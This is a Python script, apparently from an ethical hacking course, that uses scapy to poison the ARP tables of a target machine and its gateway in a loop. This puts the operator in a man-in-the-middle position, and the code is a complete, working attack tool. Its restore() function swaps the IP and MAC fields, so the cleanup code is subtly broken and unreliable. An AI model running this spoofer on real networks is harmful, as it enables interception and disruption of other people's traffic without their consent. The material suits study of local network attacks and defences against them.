# Written for python 2.7 and lower
#Based on Zaid's python and ethical hacking course
# !! NOTE: !! this dummy program uses fake IP addresses as a demo, noted in vars below in lines 30 & 31
import scapy.all as scapy
import time
import sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    # We get a list of data with mac address and hwsrc, so get the target from that list
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    # if last arg is omitted, default is set to my own MAC address (psrc)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_mac, hwsrc=source_ip)
    scapy.send(packet, count=4, verbose=False)

sent_packets_count = 0
# below are sample values only and need to be scanned for IRL
target_ip = "10.0.2.7"
gateway_ip = "10.0.2.1"

try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count += 2
        print("\r Packets sent: " + str(sent_packets_count))
        # Python 3+ print("\r start line " + str(var1), end="")
        # Will keep re-printing the line instead of filling up the terminal with garbo
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("Quitting spoofer program")
    # Fix ARP tables to set target computer back to router
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
